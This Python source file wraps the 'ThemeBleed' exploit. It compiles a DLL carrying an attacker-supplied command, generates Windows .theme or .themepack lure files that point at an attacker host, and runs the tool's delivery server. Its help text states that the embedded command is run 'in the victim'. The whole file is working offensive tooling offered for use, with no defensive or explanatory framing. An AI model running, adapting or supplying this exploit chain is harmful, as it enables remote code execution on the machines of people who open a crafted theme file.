import os
import shutil
import subprocess
import tempfile

def is_tool_available(tool):
    # Check if the specified tool is available in the system's PATH.
    return shutil.which(tool) is not None

def check_tools():
    # Check if Wine is available.
    if not is_tool_available("wine"):
        print("Wine is not available. Please install Wine.")
        return

    # Check if the ThemeBleed.exe file exists.
    if not os.path.exists("ThemeBleed.exe"):
        print("ThemeBleed.exe not found. Please provide the executable.")
        return

    # Check if x86_64-w64-mingw32-gcc is available.
    if not is_tool_available("x86_64-w64-mingw32-gcc"):
        print("x86_64-w64-mingw32-gcc not found. Please install x86_64-w64-mingw32-gcc.")
        return

def escape_command(command):
    # Escape double quotes and backslashes in the command string.
    command = command.replace("\\", "\\\\")
    command = command.replace("\"", "\\\"")
    return command

def generate_dll(host, command_to_run):
    # Create a temporary directory and copy the stage3.cpp file.
    temp_dir = tempfile.mkdtemp()
    temp_stage3_path = os.path.join(temp_dir, "temp_stage3.cpp")
    shutil.copy("stage3.cpp", temp_stage3_path)

    # Read the copied file and replace [command] with the escaped command.
    escaped_command = escape_command(command_to_run)
    with open(temp_stage3_path, "r") as stage3_file:
        stage3_code = stage3_file.read()
        stage3_code = stage3_code.replace("[command]", escaped_command)

    # Write the modified code back to the temporary file.
    with open(temp_stage3_path, "w") as temp_stage3_file:
        temp_stage3_file.write(stage3_code)

    # Compile the code into a DLL using x86_64-w64-mingw32-gcc.
    subprocess.run(
        [
            "x86_64-w64-mingw32-gcc",
            "-shared",
            "-o",
            "stage3.dll",
            temp_stage3_path,
        ]
    )

    # Move the generated DLL to the 'data' folder.
    if os.path.exists("stage3.dll"):
        shutil.move("stage3.dll", os.path.join("data", "stage_3"))
        print("stage3 compiled and moved to data folder.")
    else:
        print("Failed to generate stage3.")

    # Remove the temporary directory and its content.
    shutil.rmtree(temp_dir)

def generate_theme(host, output_path, command_to_run):
    # Generate the DLL and create the theme file using Wine.
    generate_dll(host, command_to_run)
    subprocess.run(["wine", "ThemeBleed.exe", "make_theme", host, output_path])
    print("Theme file: " + output_path + " created")

def generate_themepack(host, output_path, command_to_run):
    # Generate the DLL, create the theme file, and then convert it to a themepack using Wine.
    generate_dll(host, command_to_run)
    generate_theme(host, output_path, command_to_run)
    subprocess.run(["wine", "ThemeBleed.exe", "make_themepack", host, output_path])
    print("Theme file: " + output_path + " created")

def run_server():
    # Start the ThemeBleed server using Wine.
    subprocess.run(["wine", "ThemeBleed.exe", "server"])

def main():
    import sys

    check_tools()

    if len(sys.argv) < 2:
        # Print usage information if no command is provided.
        print("Usage: python themebleed.py <command> [<host> <output_path> <command_to_run>]")
        print("\nCommands:")
        print("generate_theme\t\t - Generate a theme file and DLL with a command to run in the victim")
        print("generate_themepack\t - Generate a themepack file and DLL with a command to run in the victim")
        print("run_server\t\t - Run the ThemeBleed server")
    else:
        command = sys.argv[1]

        if command == "generate_theme":
            if len(sys.argv) < 5:
                # Print usage information for 'generate_theme' command if not enough arguments are provided.
                print("Usage: generate_theme <host> <output_path> <command_to_run>")
            else:
                host = sys.argv[2]
                output_path = sys.argv[3]
                command_to_run = sys.argv[4]
                generate_theme(host, output_path, command_to_run)
        elif command == "generate_themepack":
            if len(sys.argv) < 5:
                # Print usage information for 'generate_themepack' command if not enough arguments are provided.
                print("Usage: generate_themepack <host> <output_path> <command_to_run>")
            else:
                host = sys.argv[2]
                output_path = sys.argv[3]
                command_to_run = sys.argv[4]
                generate_themepack(host, output_path, command_to_run)
        elif command == "run_server":
            run_server()
        else:
            # Print an error message for an invalid command.
            print("Invalid command. Use 'generate_theme', 'generate_themepack', or 'run_server'.")

if __name__ == "__main__":
    main()
